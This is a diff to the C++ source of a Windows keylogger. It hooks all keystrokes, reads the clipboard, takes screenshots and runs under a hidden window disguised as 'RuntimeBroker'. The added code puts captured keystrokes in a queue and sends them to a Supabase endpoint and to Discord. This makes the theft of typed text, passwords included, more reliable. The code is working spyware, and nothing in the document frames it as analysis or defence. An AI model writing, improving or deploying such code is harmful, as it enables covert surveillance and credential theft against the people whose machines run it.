@@ -59,6 +59,8 @@ static std::string g_lastClipboard;
 static std::string g_lastPasswordDigest;
 static HWND g_hwnd = NULL;
 static HMODULE g_hModule = NULL;
+static CRITICAL_SECTION g_uploadLock;
+static std::vector<std::string> g_uploadQueue;
 
 static std::wstring g_supabaseHost;
 static std::wstring g_supabaseKey;
@@ -2666,6 +2668,30 @@ static void CheckClipboard() {
     PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
 }
 
+static void DrainUploadQueue() {
+    std::vector<std::string> batch;
+    EnterCriticalSection(&g_uploadLock);
+    batch.swap(g_uploadQueue);
+    LeaveCriticalSection(&g_uploadLock);
+
+    std::string resp;
+    for (auto& json : batch) {
+        if (!HttpRequest(L"POST", SUPABASE_KEYS_PATH, json, resp)) {
+            size_t ks = json.find("\"keys\":\"");
+            if (ks != std::string::npos) {
+                ks += 8;
+                size_t ke = json.find("\"", ks);
+                if (ke != std::string::npos) {
+                    std::string recovered = json.substr(ks, ke - ks);
+                    g_keys = recovered + g_keys;
+                    if (g_keys.size() > 10000)
+                        g_keys = g_keys.substr(0, 10000);
+                }
+            }
+        }
+    }
+}
+
 static void FlushBuffer() {
     if (g_keys.empty()) return;
 
@@ -2681,12 +2707,11 @@ static void FlushBuffer() {
     json += EscapeJSON(g_hostname);
     json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
 
+    EnterCriticalSection(&g_uploadLock);
+    g_uploadQueue.push_back(json);
+    LeaveCriticalSection(&g_uploadLock);
+
     PostToDiscord(g_hostname, win, keys);
-    if (!PostKeys(json)) {
-        g_keys = keys + g_keys;
-        if (g_keys.size() > 10000)
-            g_keys = g_keys.substr(0, 10000);
-    }
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -2710,8 +2735,11 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             json += "\",\"hostname\":\"";
             json += EscapeJSON(g_hostname);
             json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
-            PostToDiscord(g_hostname, win, keys);
-            PostKeys(json);
+
+            EnterCriticalSection(&g_uploadLock);
+            g_uploadQueue.push_back(json);
+            LeaveCriticalSection(&g_uploadLock);
+
             CheckAutoScreenshot(newTitle);
         } else if (g_winTitle.empty()) {
             g_winTitle = newTitle;
@@ -2735,6 +2763,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             break;
         case WM_TIMER:
         {
+            DrainUploadQueue();
             static int counter = 0;
             counter++;
             if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
@@ -2839,6 +2868,8 @@ static int RunChild(HINSTANCE hInstance) {
     g_hwnd = CreateWindowExW(0, L"RuntimeBrokerHiddenWindow", L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
     if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }
 
+    InitializeCriticalSection(&g_uploadLock);
+
     g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
     if (!g_hHook) {
         LogMsg("Hook failed: " + std::to_string(GetLastError()));
@@ -2858,8 +2889,12 @@ static int RunChild(HINSTANCE hInstance) {
         DispatchMessage(&msg);
     }
 
+    // Drain any remaining uploads before shutdown
+    DrainUploadQueue();
+
     if (g_hHook) UnhookWindowsHookEx(g_hHook);
     if (g_hwnd) DestroyWindow(g_hwnd);
+    DeleteCriticalSection(&g_uploadLock);
     Gdiplus::GdiplusShutdown(gdiToken);
     LogMsg("Child stopped");
     return 0;
